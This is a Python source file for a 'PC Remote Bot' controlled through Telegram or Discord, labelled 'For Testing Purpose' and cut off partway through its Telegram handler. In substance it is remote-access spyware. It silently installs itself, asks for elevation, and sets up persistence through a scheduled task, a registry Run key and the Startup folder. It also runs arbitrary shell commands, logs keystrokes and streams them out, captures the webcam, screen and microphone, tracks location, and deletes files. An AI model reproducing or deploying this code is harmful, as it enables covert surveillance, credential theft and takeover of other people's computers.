"""
For Testing Purpose.

PC Remote Bot - Combined Telegram + Discord
==========================================
Usage:
  python tracker.py -p telegram --api YOUR_TOKEN --chat YOUR_CHAT_ID
  python tracker.py -p discord --api YOUR_TOKEN --channel YOUR_CHANNEL_ID
  python tracker.py -p both --api TELEGRAM_TOKEN --chat CHAT_ID --dapi DISCORD_TOKEN --channel CHANNEL_ID
  python tracker.py -p telegram --api TOKEN --chat ID -s windows
  python tracker.py -p telegram --api TOKEN --chat ID -s linux
"""
import argparse
import sys
import os
import time
import platform
import threading
import subprocess
import json
import ctypes
import ctypes.wintypes

# ===== CLI ARGUMENTS =====
def parse_args():
    parser = argparse.ArgumentParser(
        description="PC Remote Bot - Telegram + Discord",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "-p", "--platform",
        choices=["telegram", "discord", "both"],
        default="telegram",
        help="Platform to use:\n  telegram - Use Telegram bot\n  discord  - Use Discord bot\n  both     - Use both simultaneously"
    )
    parser.add_argument(
        "--api",
        help="Telegram Bot Token OR Discord Bot Token (if -p telegram or discord)",
        default=None
    )
    parser.add_argument(
        "--chat",
        help="Telegram Chat ID",
        default=None
    )
    parser.add_argument(
        "--dapi",
        help="Discord Bot Token (only needed if -p both)",
        default=None
    )
    parser.add_argument(
        "--channel",
        help="Discord Channel ID",
        default=None
    )
    parser.add_argument(
        "-s", "--system",
        choices=["windows", "linux"],
        default="windows",
        help="Target OS:\n  windows - Windows features enabled\n  linux   - Linux compatible mode"
    )
    parser.add_argument(
        "--install",
        action="store_true",
        help="Run self-installer (Windows only)"
    )
    parser.add_argument(
        "--no-install",
        action="store_true",
        help="Skip self-installer check"
    )
    return parser.parse_args()

args = parse_args()

# ===== DETECT OS =====
IS_WINDOWS = args.system == "windows" and platform.system() == "Windows"
IS_LINUX   = args.system == "linux"   or platform.system() == "Linux"

# ===== WINDOWS ONLY IMPORTS =====
if IS_WINDOWS:
    try:
        import winsound
        import pyttsx3
        import pythoncom
        import screen_brightness_control as sbc
        import winreg
    except ImportError as e:
        print(f"⚠️ Windows library missing: {e}")

# ===== CROSS PLATFORM IMPORTS =====
import requests
import psutil
import pyautogui
import cv2
from pynput import keyboard as pynput_keyboard
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from PIL import Image
import io
import wave

try:
    import pyaudio
    AUDIO_AVAILABLE = True
except ImportError:
    AUDIO_AVAILABLE = False
    print("⚠️ pyaudio not installed - audio features disabled")

# ===== DISCORD IMPORT =====
DISCORD_AVAILABLE = False
if args.platform in ("discord", "both"):
    try:
        import discord
        from discord.ext import commands
        DISCORD_AVAILABLE = True
    except ImportError:
        print("⚠️ discord.py not installed: pip install discord.py")

# ===== CONFIG =====
PC_NAME        = platform.node()
BOT_START_TIME = time.time() - 300

# Telegram config
TELEGRAM_TOKEN = None
CHAT_ID        = None
BASE_URL       = None

# Discord config
DISCORD_TOKEN  = None
CHANNEL_ID     = None

# Set configs based on args
if args.platform == "telegram":
    TELEGRAM_TOKEN = args.api
    CHAT_ID        = args.chat
    if TELEGRAM_TOKEN:
        BASE_URL   = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"

elif args.platform == "discord":
    DISCORD_TOKEN  = args.api
    CHANNEL_ID     = int(args.channel) if args.channel else None

elif args.platform == "both":
    TELEGRAM_TOKEN = args.api
    CHAT_ID        = args.chat
    DISCORD_TOKEN  = args.dapi
    CHANNEL_ID     = int(args.channel) if args.channel else None
    if TELEGRAM_TOKEN:
        BASE_URL   = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"

# Validate required args
if args.platform in ("telegram", "both") and not TELEGRAM_TOKEN:
    print("❌ Telegram token required: --api YOUR_TOKEN")
    sys.exit(1)
if args.platform in ("telegram", "both") and not CHAT_ID:
    print("❌ Telegram chat ID required: --chat YOUR_CHAT_ID")
    sys.exit(1)
if args.platform in ("discord", "both") and not DISCORD_TOKEN:
    print("❌ Discord token required: --api or --dapi YOUR_TOKEN")
    sys.exit(1)
if args.platform in ("discord", "both") and not CHANNEL_ID:
    print("❌ Discord channel ID required: --channel YOUR_CHANNEL_ID")
    sys.exit(1)

# ===== STATE =====
auto_tracking    = False
active_devices   = {}
alarm_running    = False
SELECTED_PC      = None
keylog_running   = False
keylog_buffer    = []
keylog_start_time= None
keylog_listener  = None
audio_recording  = False
live_screen_running = False
# ===== SINGLE INSTANCE MUTEX =====
def ensure_single_instance():
    if not IS_WINDOWS:
        return True
    try:
        exe_name   = get_exe_name()
        mutex_name = f"{exe_name}Mutex"
        mutex      = ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name)
        last_error = ctypes.windll.kernel32.GetLastError()
        if last_error == 183:
            print("⚠️ Already running! Exiting...")
            sys.exit()
        return True
    except Exception as e:
        print(f"Mutex error: {e}")
        return True
    
# ===== ADMIN CHECK =====
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def get_exe_name():
    """Get correct exe name - works with --name flag"""
    if getattr(sys, 'frozen', False):
        # ✅ Running as exe - always use actual exe filename
        return os.path.basename(sys.executable)
    else:
        # ✅ Running as script
        try:
            # Check if builder injected the name
            name = globals().get('_BUILDER_EXE_NAME', None)
            if name:
                return f"{name}.exe"
        except:
            pass
        # Fallback to script filename
        return os.path.basename(__file__)
    
def setup_autostart(install_dir, has_admin=True):
    if not IS_WINDOWS:
        return

    exe_name  = get_exe_name()           # ✅ Uses correct name
    exe_path  = os.path.join(install_dir, exe_name)
    task_name = os.path.splitext(exe_name)[0]

    if has_admin:
        result = subprocess.run(
            f'schtasks /create /tn "{task_name}" '
            f'/tr "\\"{exe_path}\\"" '
            f'/sc onlogon /rl highest /f',
            shell=True, capture_output=True, text=True
        )
        if result.returncode == 0:
            print(f"[OK] Task Scheduler: {task_name}")
        else:
            print(f"[!] Task Scheduler failed")

    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, task_name, 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)
        print(f"[OK] Registry: {task_name}")
    except Exception as e:
        print(f"[!] Registry failed: {e}")

    try:
        startup  = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        bat_path = os.path.join(startup, f"{task_name}.bat")
        with open(bat_path, "w") as f:
            f.write(f'@echo off\nstart /min "" "{exe_path}"')
        print(f"[OK] Startup folder: {task_name}.bat")
    except Exception as e:
        print(f"[!] Startup folder failed: {e}")

def self_install():
    if not IS_WINDOWS or args.no_install:
        return

    install_flag = "C:\\Tools\\tracker\\installed.flag"
    if os.path.exists(install_flag):
        return

    install_dir = "C:\\Tools\\tracker"
    os.makedirs(install_dir, exist_ok=True)

    exe_name = get_exe_name()           # ✅ Correct name
    exe_path = os.path.abspath(
        sys.executable if getattr(sys, 'frozen', False) else __file__
    )
    dest_exe = os.path.join(install_dir, exe_name)

    print(f"[*] Installing {exe_name} to {install_dir}")

    if not is_admin():
        result = ctypes.windll.shell32.ShellExecuteW(
            None, "runas",
            sys.executable if getattr(sys, 'frozen', False) else sys.executable,
            " ".join(f'"{a}"' for a in sys.argv),
            None, 0
        )

        if result <= 32:
            print("[!] UAC denied - non-admin install...")
            if exe_path.lower() != dest_exe.lower():
                subprocess.run(f'cmd /c copy /Y "{exe_path}" "{dest_exe}"', shell=True, capture_output=True)

            alarm_src = os.path.join(os.path.dirname(exe_path), "alarm.wav")
            if os.path.exists(alarm_src):
                subprocess.run(f'cmd /c copy /Y "{alarm_src}" "{os.path.join(install_dir, "alarm.wav")}"', shell=True, capture_output=True)

            setup_autostart(install_dir, has_admin=False)

            with open(install_flag, "w") as f:
                f.write("installed_no_admin")

            if exe_path.lower() != dest_exe.lower():
                subprocess.Popen([dest_exe] + sys.argv[1:], cwd=install_dir, creationflags=subprocess.CREATE_NO_WINDOW)
            return

        sys.exit()

    print("[*] Admin granted - full install...")

    if exe_path.lower() != dest_exe.lower():
        subprocess.run(f'cmd /c copy /Y "{exe_path}" "{dest_exe}"', shell=True, capture_output=True)
        print(f"[OK] {exe_name} copied!")

    alarm_src = os.path.join(os.path.dirname(exe_path), "alarm.wav")
    if os.path.exists(alarm_src):
        subprocess.run(f'cmd /c copy /Y "{alarm_src}" "{os.path.join(install_dir, "alarm.wav")}"', shell=True, capture_output=True)
        print("[OK] alarm.wav copied!")

    setup_autostart(install_dir, has_admin=True)

    with open(install_flag, "w") as f:
        f.write("installed")
    print("[OK] Installation complete!")

    if exe_path.lower() != dest_exe.lower():
        time.sleep(2)
        subprocess.Popen([dest_exe] + sys.argv[1:], cwd=install_dir, creationflags=subprocess.CREATE_NO_WINDOW)
        sys.exit()

# ===== CALL ORDER (important!) =====
ensure_single_instance()  # ✅ 1st - prevent duplicates
self_install()            # ✅ 2nd - install on first run

# ===== FIX WORKING DIRECTORY =====
if getattr(sys, 'frozen', False):
    os.chdir(os.path.dirname(sys.executable))
else:
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    
# ===== ROBUST SESSION =====
def create_session():
    session = requests.Session()
    retry   = Retry(total=5, backoff_factor=2, status_forcelist=[500,502,503,504])
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("https://", adapter)
    session.mount("http://",  adapter)
    return session

session = create_session()

def safe_post(url, **kwargs):
    while True:
        try:
            return session.post(url, timeout=10, **kwargs)
        except:
            time.sleep(10)

def safe_get(url, **kwargs):
    while True:
        try:
            return session.get(url, timeout=10, **kwargs)
        except:
            time.sleep(10)

# ================================================================
# CORE FUNCTIONS (shared by Telegram + Discord)
# ================================================================

# ===== TERMINAL =====
def run_terminal_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = ""
        if result.stdout: output += f"Output:\n{result.stdout}"
        if result.stderr: output += f"\nError:\n{result.stderr}"
        if not result.stdout and not result.stderr: output = "Command executed (no output)"
        if result.returncode != 0: output += f"\nReturn code: {result.returncode}"
        return output
    except subprocess.TimeoutExpired:
        return "Command timed out (30s)"
    except Exception as e:
        return f"Error: {str(e)}"

# ===== TTS =====
def say_text(text, send_fn):
    if not IS_WINDOWS:
        send_fn(f"❌ TTS only available on Windows")
        return
    try:
        pythoncom.CoInitialize()
        engine = pyttsx3.init()
        engine.setProperty('rate', 150)
        engine.say(text)
        engine.runAndWait()
        engine.stop()
        pythoncom.CoUninitialize()
        send_fn(f"🗣 Said: {text}")
    except Exception as e:
        send_fn(f"❌ TTS failed: {str(e)}")

# ===== POWER =====
def shutdown_pc(send_fn):
    try:
        send_fn("🔴 Shutting down in 5s...")
        if IS_WINDOWS:
            subprocess.run("shutdown /s /t 5", shell=True)
        else:
            subprocess.run("shutdown -h +1", shell=True)
    except Exception as e:
        send_fn(f"❌ Shutdown failed: {str(e)}")

def restart_pc(send_fn):
    try:
        send_fn("🔄 Restarting in 5s...")
        if IS_WINDOWS:
            subprocess.run("shutdown /r /t 5", shell=True)
        else:
            subprocess.run("reboot", shell=True)
    except Exception as e:
        send_fn(f"❌ Restart failed: {str(e)}")

def lock_pc(send_fn):
    try:
        if IS_WINDOWS:
            subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"])
        else:
            subprocess.run(["loginctl", "lock-session"])
        send_fn("🔒 PC Locked")
    except Exception as e:
        send_fn(f"❌ Lock failed: {str(e)}")

# ===== VOLUME =====
def volume_up(send_fn):
    try:
        if IS_WINDOWS:
            subprocess.run('powershell -c "(New-Object -comObject WScript.Shell).SendKeys([char]175)"', shell=True)
        else:
            subprocess.run("amixer set Master 10%+", shell=True)
        send_fn("🔊 Volume increased")
    except Exception as e:
        send_fn(f"❌ Volume error: {str(e)}")

def volume_down(send_fn):
    try:
        if IS_WINDOWS:
            subprocess.run('powershell -c "(New-Object -comObject WScript.Shell).SendKeys([char]174)"', shell=True)
        else:
            subprocess.run("amixer set Master 10%-", shell=True)
        send_fn("🔉 Volume decreased")
    except Exception as e:
        send_fn(f"❌ Volume error: {str(e)}")

def volume_mute(send_fn):
    try:
        if IS_WINDOWS:
            subprocess.run('powershell -c "(New-Object -comObject WScript.Shell).SendKeys([char]173)"', shell=True)
        else:
            subprocess.run("amixer set Master toggle", shell=True)
        send_fn("🔇 Volume mute toggled")
    except Exception as e:
        send_fn(f"❌ Mute error: {str(e)}")

def volume_set(level, send_fn):
    try:
        level = max(0, min(100, int(level)))
        if IS_WINDOWS:
            script = f"""
$code = @"
using System.Runtime.InteropServices;
[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume {{
    int f(); int g(); int h(); int i();
    int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);
    int j(); int GetMasterVolumeLevelScalar(out float pfLevel);
    int k(); int l(); int m(); int n();
    int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);
    int GetMute(out bool pbMute);
}}
[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDevice {{
    int Activate(ref System.Guid id, uint ctx, System.IntPtr parms, [MarshalAs(UnmanagedType.IUnknown)] out object ppInterface);
}}
[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDeviceEnumerator {{
    int f(); int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice ppDevice);
}}
[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorClass {{}}
public class AudioManager {{
    public static void SetVolume(float level) {{
        var e = (IMMDeviceEnumerator)(new MMDeviceEnumeratorClass());
        IMMDevice d; e.GetDefaultAudioEndpoint(0,1,out d);
        var iid = typeof(IAudioEndpointVolume).GUID;
        object o; d.Activate(ref iid,23,System.IntPtr.Zero,out o);
        ((IAudioEndpointVolume)o).SetMasterVolumeLevelScalar(level, System.Guid.Empty);
    }}
}}
"@
Add-Type -TypeDefinition $code
[AudioManager]::SetVolume({level/100})
Write-Output "OK"
"""
            result = subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-Command", script], capture_output=True, text=True, timeout=15)
            if "OK" in result.stdout:
                send_fn(f"🔊 Volume set to {level}%")
            else:
                send_fn(f"❌ Failed: {result.stderr[:200]}")
        else:
            subprocess.run(f"amixer set Master {level}%", shell=True)
            send_fn(f"🔊 Volume set to {level}%")
    except Exception as e:
        send_fn(f"❌ Volume error: {str(e)}")

# ===== BRIGHTNESS =====
def set_brightness(level, send_fn):
    try:
        if IS_WINDOWS:
            sbc.set_brightness(max(0, min(100, int(level))))
        else:
            subprocess.run(f"brightnessctl set {level}%", shell=True)
        send_fn(f"☀️ Brightness set to {level}%")
    except Exception as e:
        send_fn(f"❌ Brightness error: {str(e)}")

def get_brightness(send_fn):
    try:
        if IS_WINDOWS:
            level = sbc.get_brightness()
            send_fn(f"☀️ Brightness: {level[0]}%")
        else:
            result = subprocess.run("brightnessctl get", shell=True, capture_output=True, text=True)
            send_fn(f"☀️ Brightness: {result.stdout.strip()}")
    except Exception as e:
        send_fn(f"❌ Brightness error: {str(e)}")

# ===== SCREENSHOT =====
def take_screenshot():
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "screen.png")
    pyautogui.screenshot(path)
    return path

# ===== WEBCAM =====
def take_webcam():
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cam.png")
    cam  = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        cv2.imwrite(path, frame)
    cam.release()
    return path

# ===== ALARM =====
def play_alarm(send_fn):
    global alarm_running
    alarm_running = True
    if IS_WINDOWS:
        alarm_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "alarm.wav")
        if os.path.exists(alarm_path):
            winsound.PlaySound(alarm_path, winsound.SND_FILENAME | winsound.SND_ASYNC | winsound.SND_LOOP)
        else:
            winsound.PlaySound("SystemExclamation", winsound.SND_ALIAS | winsound.SND_ASYNC | winsound.SND_LOOP)
    else:
        subprocess.Popen(["aplay", "-l"])
    send_fn("🔊 Alarm started")

def stop_alarm(send_fn):
    global alarm_running
    alarm_running = False
    if IS_WINDOWS:
        winsound.PlaySound(None, winsound.SND_PURGE)
    send_fn("🛑 Alarm stopped")

# ===== LOCATION =====
def get_location():
    try:
        ip   = safe_get("https://api.ipify.org").text
        data = safe_get(f"http://ip-api.com/json/{ip}").json()
        lat, lon = data.get("lat"), data.get("lon")
        return f"📍 {data.get('city')}, {data.get('regionName')}, {data.get('country')}\n🌐 IP: {ip}\n🗺 https://maps.google.com/?q={lat},{lon}"
    except Exception as e:
        return f"❌ Location error: {str(e)}"

# ===== STATUS =====
def get_status():
    try:
        uptime  = time.time() - psutil.boot_time()
        hours   = int(uptime // 3600)
        mins    = int((uptime % 3600) // 60)
        battery = psutil.sensors_battery()
        batt    = f"{battery.percent}%" if battery else "N/A"
        uptime_str = f"{hours}h {mins}m" if hours > 0 else f"{mins}m"
        return f"💻 {PC_NAME}\n🧠 CPU: {psutil.cpu_percent()}%\n🧬 RAM: {psutil.virtual_memory().percent}%\n🔋 Battery: {batt}\n⏱ Uptime: {uptime_str}"
    except Exception as e:
        return f"❌ Status error: {str(e)}"

# ===== FILE MANAGER =====
def list_files(path, send_fn):
    try:
        if not path: path = os.getcwd()
        items   = os.listdir(path)
        folders = [f"📂 {i}" for i in items if os.path.isdir(os.path.join(path, i))]
        files   = []
        for i in items:
            if os.path.isfile(os.path.join(path, i)):
                size = os.path.getsize(os.path.join(path, i))
                size_str = f"{size//1024//1024}MB" if size>=1024*1024 else f"{size//1024}KB" if size>=1024 else f"{size}B"
                files.append(f"📄 {i} ({size_str})")
        output = f"📁 {path}\n\n" + "\n".join(folders + files) or "(empty)"
        send_fn(output)
    except Exception as e:
        send_fn(f"❌ Error: {str(e)}")

def delete_file(path, send_fn):
    try:
        if not os.path.exists(path):
            send_fn(f"❌ Not found: {path}"); return
        if os.path.isdir(path):
            import shutil; shutil.rmtree(path)
            send_fn(f"🗑 Deleted folder: {path}")
        else:
            os.remove(path)
            send_fn(f"🗑 Deleted: {path}")
    except Exception as e:
        send_fn(f"❌ Delete failed: {str(e)}")

def search_files(filename, search_path, send_fn):
    try:
        send_fn(f"🔍 Searching '{filename}'...")
        results = []
        for root, dirs, files in os.walk(search_path):
            dirs[:] = [d for d in dirs if d not in ['Windows','$Recycle.Bin','System Volume Information']]
            for file in files:
                if filename.lower() in file.lower():
                    results.append(os.path.join(root, file))
                if len(results) >= 20: break
            if len(results) >= 20: break
        output = f"🔍 Found {len(results)}:\n" + "\n".join(results) if results else f"❌ Not found: {filename}"
        send_fn(output)
    except Exception as e:
        send_fn(f"❌ Search failed: {str(e)}")

# ===== NOTIFICATIONS =====
def show_popup(text, send_fn):
    try:
        if IS_WINDOWS:
            subprocess.Popen(
                f'powershell -c "Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show(\'{text}\',\'PC Remote Bot\')"',
                shell=True
            )
        else:
            subprocess.Popen(["notify-send", "PC Remote Bot", text])
        send_fn(f"✅ Popup shown on {PC_NAME}")
    except Exception as e:
        send_fn(f"❌ Popup failed: {str(e)}")

def show_toast_with_reply(text, send_fn):
    try:
        import re, http.server, urllib.parse, socket
        clean_text    = re.sub(r'[^\x00-\x7F]+', '', text).strip()
        reply_received = [None]

        class ReplyHandler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                query  = urllib.parse.urlparse(self.path).query
                params = urllib.parse.parse_qs(query)
                if "reply" in params:
                    reply_received[0] = params["reply"][0]
                self.send_response(200); self.end_headers(); self.wfile.write(b"OK")
            def log_message(self, format, *args): pass

        s = socket.socket(); s.bind(("", 0)); port = s.getsockname()[1]; s.close()
        server = http.server.HTTPServer(("localhost", port), ReplyHandler)

        vbs_content = f'Dim reply\nreply = InputBox("{clean_text}", "PC Remote Bot")\nIf reply <> "" Then\n    Dim http\n    Set http = CreateObject("MSXML2.XMLHTTP")\n    http.Open "GET", "http://localhost:{port}/?reply=" & reply, False\n    http.Send\nEnd If\n'
        vbs_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "reply.vbs")
        with open(vbs_path, "w", encoding="ascii", errors="ignore") as f:
            f.write(vbs_content)

        subprocess.Popen(["wscript.exe", vbs_path])
        send_fn(f"✅ Reply box shown on {PC_NAME}\nWaiting...")
        server.timeout = 30; server.handle_request()
        if reply_received[0]: send_fn(f"💬 Reply from {PC_NAME}:\n{reply_received[0]}")
        else: send_fn(f"⏰ No reply received")
        if os.path.exists(vbs_path): os.remove(vbs_path)
    except Exception as e:
        send_fn(f"❌ Failed: {str(e)}")

# ===== KEYLOGGER =====
def on_press(key):
    global keylog_buffer
    try:
        if key.char is not None:
            keylog_buffer.append(key.char)
    except AttributeError:
        special = {
            pynput_keyboard.Key.space: " ", pynput_keyboard.Key.enter: "\n[ENTER]\n",
            pynput_keyboard.Key.backspace: "[BACK]", pynput_keyboard.Key.tab: "[TAB]",
            pynput_keyboard.Key.shift: "[SHIFT]", pynput_keyboard.Key.ctrl_l: "[CTRL]",
            pynput_keyboard.Key.ctrl_r: "[CTRL]", pynput_keyboard.Key.alt_l: "[ALT]",
            pynput_keyboard.Key.alt_r: "[ALT]", pynput_keyboard.Key.caps_lock: "[CAPS]",
            pynput_keyboard.Key.delete: "[DEL]", pynput_keyboard.Key.esc: "[ESC]",
            pynput_keyboard.Key.cmd: "[WIN]",
        }
        formatted = special.get(key, f"[{str(key).replace('Key.','').upper()}]")
        if formatted: keylog_buffer.append(str(formatted))

def start_keylogger(send_fn):
    global keylog_running, keylog_buffer, keylog_start_time, keylog_listener
    try:
        keylog_buffer     = []
        keylog_start_time = time.time()
        keylog_listener   = pynput_keyboard.Listener(on_press=on_press)
        keylog_listener.start()
        keylog_running    = True
    except Exception as e:
        keylog_running = False
        send_fn(f"❌ Keylogger failed: {str(e)}")

def stop_keylogger(send_fn):
    global keylog_running, keylog_listener
    keylog_running = False
    if keylog_listener:
        keylog_listener.stop()
        keylog_listener = None
    send_fn("🛑 Keylogger stopped!")

def get_keylog_buffer():
    global keylog_buffer
    data = "".join([str(k) for k in keylog_buffer if k is not None])
    keylog_buffer = []
    return data

def send_keylog(label, send_fn):
    data = get_keylog_buffer()
    if data.strip():
        duration = int(time.time() - keylog_start_time)
        send_fn(f"{label} on {PC_NAME}\nDuration: {duration}s\n{'─'*20}\n{data}")
    else:
        send_fn(f"⌨️ No keys captured yet")

def start_realtime_keylog(send_fn):
    global keylog_running
    def sender():
        while keylog_running:
            time.sleep(3)
            data = get_keylog_buffer()
            if data.strip(): send_fn(f"⌨️ [{PC_NAME}] {data}")
    start_keylogger(send_fn)
    if keylog_running:
        threading.Thread(target=sender, daemon=True).start()
        send_fn(f"⌨️ Real-time keylog started on {PC_NAME}\n/stopkey to stop")

def start_interval_keylog(interval_minutes, send_fn):
    global keylog_running
    def sender():
        while keylog_running:
            time.sleep(interval_minutes * 60)
            if keylog_running: send_keylog(f"📋 Interval log ({interval_minutes} min)", send_fn)
    start_keylogger(send_fn)
    if keylog_running:
        threading.Thread(target=sender, daemon=True).start()
        send_fn(f"📋 Interval keylog started ({interval_minutes} mins)\n/getkeys - get now\n/stopkey - stop")

def save_keylog_to_file(send_fn, upload_fn):
    data = get_keylog_buffer()
    if not data.strip(): send_fn("❌ No keys to save"); return
    log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), f"keylog_{int(time.time())}.txt")
    with open(log_path, "w", encoding="utf-8") as f:
        f.write(f"PC: {PC_NAME}\nTime: {time.strftime('%Y-%m-%d %H:%M:%S')}\n{'='*30}\n{data}")
    upload_fn(log_path)
    os.remove(log_path)

# ===== AUDIO RECORDING =====
def record_audio(duration, send_fn, upload_fn):
    global audio_recording
    if not AUDIO_AVAILABLE:
        send_fn("❌ pyaudio not installed: pip install pyaudio"); return
    try:
        audio_recording = True
        CHUNK=1024; FORMAT=pyaudio.paInt16; CHANNELS=1; RATE=44100
        p      = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        send_fn(f"🎙 Recording {duration}s on {PC_NAME}...")
        frames = []
        for _ in range(0, int(RATE/CHUNK*duration)):
            if not audio_recording: break
            frames.append(stream.read(CHUNK, exception_on_overflow=False))
        stream.stop_stream(); stream.close(); p.terminate()
        if frames:
            path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "audio.wav")
            wf = wave.open(path, 'wb')
            wf.setnchannels(CHANNELS); wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE); wf.writeframes(b''.join(frames)); wf.close()
            send_fn("✅ Recording done! Uploading...")
            upload_fn(path)
            os.remove(path)
        audio_recording = False
    except Exception as e:
        audio_recording = False
        send_fn(f"❌ Recording failed: {str(e)}")

def live_audio_stream(duration, send_fn, upload_fn):
    global audio_recording
    if not AUDIO_AVAILABLE:
        send_fn("❌ pyaudio not installed"); return
    try:
        audio_recording = True
        CHUNK=1024; FORMAT=pyaudio.paInt16; CHANNELS=1; RATE=44100; INTERVAL=10
        p      = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        send_fn(f"🔴 Live audio started on {PC_NAME}\n/stopaudio to stop")
        chunk_num = 1
        while audio_recording:
            frames = []
            for _ in range(0, int(RATE/CHUNK*INTERVAL)):
                if not audio_recording: break
                frames.append(stream.read(CHUNK, exception_on_overflow=False))
            if frames:
                path = os.path.join(os.path.dirname(os.path.abspath(__file__)), f"live_{chunk_num}.wav")
                wf = wave.open(path, 'wb')
                wf.setnchannels(CHANNELS); wf.setsampwidth(p.get_sample_size(FORMAT))
                wf.setframerate(RATE); wf.writeframes(b''.join(frames)); wf.close()
                send_fn(f"🎙 Live chunk {chunk_num}:")
                upload_fn(path); os.remove(path); chunk_num += 1
            if duration and chunk_num > duration // INTERVAL: break
        stream.stop_stream(); stream.close(); p.terminate()
        audio_recording = False
        send_fn(f"🛑 Live audio ended. {chunk_num-1} chunks sent.")
    except Exception as e:
        audio_recording = False
        send_fn(f"❌ Live audio failed: {str(e)}")

# ===== LIVE SCREEN =====
def live_screen_capture(duration, interval, send_fn, send_image_fn):
    global live_screen_running
    live_screen_running = True
    count = 0
    send_fn(f"🖥 Live screen started! Duration:{duration}s Interval:{interval}s\n/stopscreen to stop")
    start = time.time()
    while live_screen_running and time.time() - start < duration:
        try:
            screenshot = pyautogui.screenshot()
            screenshot = screenshot.resize((1280, 720), Image.LANCZOS)
            img_bytes  = io.BytesIO()
            screenshot.save(img_bytes, format='JPEG', quality=40)
            img_bytes.seek(0)
            send_image_fn(img_bytes, f"screen_{count}.jpg")
            count += 1
            time.sleep(interval)
        except Exception as e:
            send_fn(f"❌ Screen error: {str(e)}"); break
    live_screen_running = False
    send_fn(f"🛑 Live screen ended. {count} frames sent.")

# ===== AUTO TRACK =====
def auto_track_fn(send_fn):
    global auto_tracking
    while auto_tracking:
        send_fn(get_location())
        time.sleep(300)

# ===== WAKE DETECTION (Windows only) =====
def listen_for_wake(send_fn):
    if not IS_WINDOWS: return
    WM_POWERBROADCAST=0x0218; PBT_APMRESUMEAUTOMATIC=0x0012; PBT_APMRESUMESUSPEND=0x0007
    WNDPROCTYPE = ctypes.WINFUNCTYPE(ctypes.c_int64, ctypes.c_void_p, ctypes.c_uint, ctypes.c_int64, ctypes.c_int64)
    def wnd_proc(hwnd, msg, wparam, lparam):
        try:
            if msg == WM_POWERBROADCAST and wparam in (PBT_APMRESUMEAUTOMATIC, PBT_APMRESUMESUSPEND):
                send_fn(f"☀️ {PC_NAME} woke from sleep!")
                active_devices[PC_NAME] = time.time()
        except: pass
        return ctypes.windll.user32.DefWindowProcW(ctypes.c_void_p(hwnd), ctypes.c_uint(msg), ctypes.c_int64(wparam), ctypes.c_int64(lparam))
    wnd_proc_ptr = WNDPROCTYPE(wnd_proc)
    class WNDCLASS(ctypes.Structure):
        _fields_ = [("style",ctypes.c_uint),("lpfnWndProc",ctypes.c_void_p),("cbClsExtra",ctypes.c_int),("cbWndExtra",ctypes.c_int),("hInstance",ctypes.c_void_p),("hIcon",ctypes.c_void_p),("hCursor",ctypes.c_void_p),("hbrBackground",ctypes.c_void_p),("lpszMenuName",ctypes.c_wchar_p),("lpszClassName",ctypes.c_wchar_p)]
    ctypes.windll.user32.DefWindowProcW.restype  = ctypes.c_int64
    ctypes.windll.user32.DefWindowProcW.argtypes = [ctypes.c_void_p, ctypes.c_uint, ctypes.c_int64, ctypes.c_int64]
    hinstance = ctypes.windll.kernel32.GetModuleHandleW(None)
    wc = WNDCLASS(); wc.lpfnWndProc = ctypes.cast(wnd_proc_ptr, ctypes.c_void_p); wc.hInstance = hinstance; wc.lpszClassName = "BotWakeListener"
    ctypes.windll.user32.RegisterClassW(ctypes.byref(wc))
    hwnd = ctypes.windll.user32.CreateWindowExW(0,"BotWakeListener","BotWakeListener",0,0,0,0,0,None,None,hinstance,None)
    if not hwnd: return
    msg_struct = ctypes.wintypes.MSG()
    while True:
        ret = ctypes.windll.user32.GetMessageW(ctypes.byref(msg_struct), None, 0, 0)
        if ret == 0 or ret == -1: break
        ctypes.windll.user32.TranslateMessage(ctypes.byref(msg_struct))
        ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg_struct))

# ================================================================
# TELEGRAM BOT
# ================================================================
def run_telegram_bot():
    if not TELEGRAM_TOKEN or not CHAT_ID:
        return

    global auto_tracking, SELECTED_PC

    def tg_send(text):
        if len(text) > 4000: text = text[:4000] + "\n...(truncated)"
